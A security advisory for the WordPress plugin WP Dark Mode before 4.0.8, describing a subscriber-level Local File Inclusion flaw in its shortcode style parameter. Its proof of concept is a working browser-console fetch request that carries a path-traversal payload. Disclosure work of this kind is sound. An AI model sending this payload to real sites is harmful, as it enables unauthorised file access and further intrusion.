## WordPress Plugin Vulnerabilities

# WP Dark Mode < 4.0.8 - Subscriber+ Local File Inclusion

### Description

The plugin does not properly sanitize the style parameter in shortcodes before using it to load a PHP template. This leads to Local File Inclusion on servers where non-existent directories may be traversed, or when chained with another vulnerability allowing arbitrary directory creation.

### Proof of Concept

As a subscriber, run the following JS code from the browser console and see that it includes the `index.php` of the root of the blog:
```
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[wp-dark-mode style='1/../../../../../index']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
```
Note: By default this will only work on servers where the directory to traverse does not need to exist (for example: Windows-based servers). For other servers, this will require the `/wp-content-plugins/wp-dark-mode/templates/btn-1/` directory to exist (for example: by chaining another vulnerability to create the directory).
